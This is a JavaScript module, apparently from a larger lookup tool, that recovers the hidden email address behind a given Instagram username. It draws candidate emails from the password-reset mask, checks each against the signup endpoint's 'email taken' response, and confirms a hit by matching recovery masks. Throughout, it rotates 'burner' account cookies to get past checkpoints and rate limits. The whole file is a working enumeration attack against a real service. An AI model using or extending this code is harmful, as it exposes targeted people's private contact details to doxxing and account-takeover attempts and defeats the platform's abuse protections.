/**
 * §2.2 STAGE 3 — Email enumeration via `web_create_ajax/attempt/`.
 *
 * The candidate generator (`candidateGenerator.emailCandidates`) hands
 * us a ranked list of email addresses derived from the obfuscated mask
 * the reset oracle returned for the username. This module turns that
 * list into a CONFIRMED full email by:
 *
 *   1.  Burner-cookie draw (`burnerPoolService.drawBurner`) — every
 *       probe burns burner-IP budget, so we fail fast when the pool
 *       is empty.
 *
 *   2.  For each candidate (top-N, capped by the per-job budget):
 *
 *       a.  POST /accounts/web_create_ajax/attempt/    email=<cand>
 *           Response shape that indicates the email is ALREADY
 *           associated with an IG account:
 *               { "errors": { "email": ["This email is taken."] } }
 *           (IG localises this string — we match on the word
 *           "taken" and also on the IG-internal error code
 *           `email_taken_on_login_attempt`.)
 *
 *       b.  Cross-check the candidate against the *target's mask*
 *           by re-running `account_recovery_send_ajax` with the
 *           candidate as the recovery identifier. If IG returns
 *           the SAME `obfuscated_email` we observed for the target
 *           username, the candidate IS the target's email and we
 *           upgrade the finding to `verified: true`.
 *
 *   3.  Stop conditions:
 *         * confirmed match → stop early, do not waste budget on
 *           further candidates
 *         * burner says checkpoint_required → block the burner,
 *           swap to a new one, retry up to `maxBurnerRotations`
 *           rotations
 *         * candidate budget exhausted → return what we have
 *
 *   4.  Release the burner with the appropriate outcome marker.
 *
 * §10 — this NEVER triggers a real reset email. The "_send_ajax"
 * endpoint is the mask-fetch stage; the real-send endpoint is a
 * different URL we never call.
 */

'use strict';

const logger = require('../../../utils/logger');
const { igFetch } = require('../igFetch');
const burnerPool = require('../../../services/burnerPoolService');
const lookupLimiter = require('./lookupLimiter');
const candidateGenerator = require('./candidateGenerator');
const { fromBurner } = require('./burnerCtx');
const { _maskHash } = require('./resetOracle');

const WEB_CREATE_AJAX =
  'https://www.instagram.com/accounts/web_create_ajax/attempt/';
const ACCOUNT_RECOVERY_SEND_AJAX =
  'https://www.instagram.com/accounts/account_recovery_send_ajax/';

const DEFAULT_MAX_CANDIDATES = 20;
const DEFAULT_MAX_BURNER_ROTATIONS = 3;

function _isTakenResponse(body) {
  if (!body || typeof body !== 'object') return false;
  if (body.errors && body.errors.email && Array.isArray(body.errors.email)) {
    return body.errors.email.some((m) =>
      /taken|already|in use|registered/i.test(String(m))
    );
  }
  // Some IG variants nest the email error under `email`.
  if (body.error_type === 'email_taken_on_login_attempt') return true;
  if (Array.isArray(body.email_errors)) {
    return body.email_errors.some((m) => /taken|already|in use/i.test(String(m)));
  }
  return false;
}

function _classifyResponse(body) {
  if (!body || typeof body !== 'object') return 'unknown';
  if (_isTakenResponse(body)) return 'taken';
  if (body.errors && body.errors.email) return 'rejected';
  if (body.status === 'fail' && body.message) {
    const m = String(body.message).toLowerCase();
    if (/checkpoint/.test(m)) return 'checkpoint';
    if (/rate|throttle|wait/.test(m)) return 'rate_limited';
  }
  if (body.account_created === true) return 'created'; // never seen, but guard
  return 'available';
}

async function _probeCandidate(ctx, email) {
  const form = new URLSearchParams({
    enc_password: '#PWD_INSTAGRAM_BROWSER:0:0:',
    email,
    username: '',
    first_name: '',
    opt_into_one_tap: 'false',
  }).toString();
  try {
    const r = await igFetch(ctx, WEB_CREATE_AJAX, {
      method: 'POST',
      body: form,
      extraHeaders: {
        'content-type': 'application/x-www-form-urlencoded',
        'x-instagram-ajax': '1',
        'x-csrftoken': ctx.csrftoken || '',
      },
      referer: 'https://www.instagram.com/accounts/emailsignup/',
      skipLimiter: true,
      logErrors: false,
      preSleepMs: 800,
    });
    return { ok: true, body: r };
  } catch (err) {
    // 400 with JSON body is the NORMAL path for "email taken" — IG
    // returns errors via a 400. `igFetch.classifyError` may have
    // already turned this into a thrown error; surface the body.
    return {
      ok: false,
      error: err.kind || 'network',
      message: err.message || String(err),
      statusCode: err.statusCode || null,
    };
  }
}

async function _maskForCandidate(anonCtx, candidateEmail) {
  const form = new URLSearchParams({
    email_or_username: candidateEmail,
    recover_token: '',
    flow: 'web_password_recovery',
  }).toString();
  try {
    return await igFetch(anonCtx, ACCOUNT_RECOVERY_SEND_AJAX, {
      method: 'POST',
      body: form,
      extraHeaders: {
        'content-type': 'application/x-www-form-urlencoded',
        'x-instagram-ajax': '1',
      },
      referer: 'https://www.instagram.com/accounts/password/reset/',
      skipLimiter: true,
      logErrors: false,
      preSleepMs: 400,
    });
  } catch (err) {
    return { error: err.kind || 'network', message: err.message || String(err) };
  }
}

async function run(username, opts = {}) {
  const cleaned = String(username || '').trim().replace(/^@+/, '').toLowerCase();
  if (!/^[a-z0-9._]{1,30}$/i.test(cleaned)) {
    return {
      method: 'email_enum',
      ok: false,
      error: 'invalid_username',
      findings: [],
    };
  }

  // The reset oracle's stored mask (if any) is required to do the
  // CONFIRMATION step. Without it, we can still surface "this email
  // is on IG" but can't verify it's the TARGET's email.
  const targetMask = opts.targetMask || (opts.resetOracleSnapshot && opts.resetOracleSnapshot.obfuscated_email) || null;
  const targetMaskHash = targetMask ? _maskHash(targetMask) : null;

  const candidates = candidateGenerator.emailCandidates(targetMask, cleaned, {
    maxLocalLen: opts.maxLocalLen || undefined,
  }).slice(0, opts.maxCandidates || DEFAULT_MAX_CANDIDATES);

  if (!candidates.length) {
    return {
      method: 'email_enum',
      ok: true,
      findings: [{
        method: 'email_enum',
        kind: 'note',
        value: targetMask
          ? `email_enum: no candidates after mask filter (mask=${targetMask})`
          : 'email_enum: no obfuscated_email mask available — run reset_oracle first',
        confidence: 0,
      }],
      raw: { mask: targetMask, candidateCount: 0 },
    };
  }

  await lookupLimiter.acquire(cleaned, { class: 'risky' });

  let burner = await burnerPool.drawBurner();
  if (!burner) {
    return {
      method: 'email_enum',
      ok: false,
      error: 'no_burner_available',
      message: 'burner pool empty — add burner cookies on the Burners page or contact admin',
      findings: [{
        method: 'email_enum',
        kind: 'note',
        value: 'email_enum: burner pool empty — cannot validate candidates against web_create_ajax',
        confidence: 0,
      }],
    };
  }

  let ctx = fromBurner(burner);
  // Anonymous context for the mask cross-check step (we don't want to
  // burn the burner cookie on the recovery endpoint — recovery accepts
  // anonymous calls).
  const anonCtx = {
    sessionId: `lookup-enum:${cleaned}`,
    allowAnonymous: true,
    username: null,
    proxyUrl: null,
    bypassProxy: true,
    cookieHeader: '',
    csrftoken: '',
    dsUserId: null,
    blob: null,
    webFingerprint: ctx.webFingerprint,
    locale: ctx.locale,
    apiMode: 'web',
  };

  const findings = [];
  const probedDetails = [];
  let confirmedEmail = null;
  let rotations = 0;
  const maxRotations = opts.maxBurnerRotations || DEFAULT_MAX_BURNER_ROTATIONS;
  let burnerOutcome = 'ok';

  for (const cand of candidates) {
    if (confirmedEmail) break;
    const probe = await _probeCandidate(ctx, cand.email);
    let classification = 'unknown';
    if (probe.ok) {
      classification = _classifyResponse(probe.body);
    } else if (probe.statusCode === 400) {
      // 400 with JSON body — classify from response if igFetch surfaced it.
      classification = _classifyResponse(probe.body || {});
    } else if (probe.statusCode === 403 || probe.error === 'forbidden') {
      classification = 'checkpoint';
    } else if (probe.error === 'rate_limited' || probe.statusCode === 429) {
      classification = 'rate_limited';
    }
    probedDetails.push({ email: cand.email, classification, confidence: cand.confidence });

    if (classification === 'checkpoint' || classification === 'rate_limited') {
      burnerOutcome = classification === 'checkpoint' ? 'checkpoint' : 'rate_limited';
      await burnerPool.releaseBurner(burner.id, {
        outcome: burnerOutcome,
        block: classification === 'checkpoint',
        blockReason: classification,
      });
      if (rotations >= maxRotations) {
        findings.push({
          method: 'email_enum',
          kind: 'note',
          value: `email_enum: burner pool exhausted after ${rotations} rotations (last outcome=${classification})`,
          confidence: 0,
          raw: { rotations, classification, probed: probedDetails },
        });
        break;
      }
      rotations += 1;
      burner = await burnerPool.drawBurner();
      if (!burner) {
        findings.push({
          method: 'email_enum',
          kind: 'note',
          value: 'email_enum: ran out of fresh burners — add more on the Burners page',
          confidence: 0,
          raw: { rotations, classification, probed: probedDetails },
        });
        return {
          method: 'email_enum',
          ok: false,
          error: 'no_burner_available',
          message: 'burner pool drained mid-enumeration',
          findings,
          raw: { mask: targetMask, probed: probedDetails },
        };
      }
      ctx = fromBurner(burner);
      continue;
    }

    if (classification === 'taken') {
      // First-stage hit — email is on IG. Try to confirm it's the
      // target by comparing the mask the recovery endpoint returns for
      // this candidate vs the target's stored mask.
      let verified = false;
      let candidateMask = null;
      if (targetMaskHash) {
        const m = await _maskForCandidate(anonCtx, cand.email);
        candidateMask = m && (m.obfuscated_email || m.email || m.contact_point) || null;
        if (candidateMask && _maskHash(candidateMask) === targetMaskHash) {
          verified = true;
          confirmedEmail = cand.email;
        }
      }
      findings.push({
        method: 'email_enum',
        kind: 'email',
        value: cand.email,
        confidence: verified ? 95 : Math.min(80, cand.confidence + 10),
        verified,
        sourceUrl: 'https://www.instagram.com/accounts/web_create_ajax/attempt/',
        raw: {
          stage_3: 'taken',
          mask_match: verified,
          target_mask: targetMask,
          candidate_mask: candidateMask,
          mask_hash: candidateMask ? _maskHash(candidateMask) : null,
        },
      });
    }
  }

  await burnerPool.releaseBurner(burner.id, {
    outcome: burnerOutcome,
    probesUsed: probedDetails.length,
  });

  if (!findings.length) {
    findings.push({
      method: 'email_enum',
      kind: 'note',
      value: `email_enum: probed ${probedDetails.length} candidates — no IG-taken hit`,
      confidence: 0,
      raw: { mask: targetMask, probed: probedDetails },
    });
  }

  logger.info(`IG.lookup.emailEnum: ${cleaned} → probed=${probedDetails.length} confirmed=${confirmedEmail || 'none'}`);

  return {
    method: 'email_enum',
    ok: true,
    findings,
    raw: {
      mask: targetMask,
      maskHash: targetMaskHash,
      probed: probedDetails,
      confirmedEmail,
      rotations,
    },
    cost_usd_estimate: 0,
  };
}

module.exports = { run, _classifyResponse, _isTakenResponse };
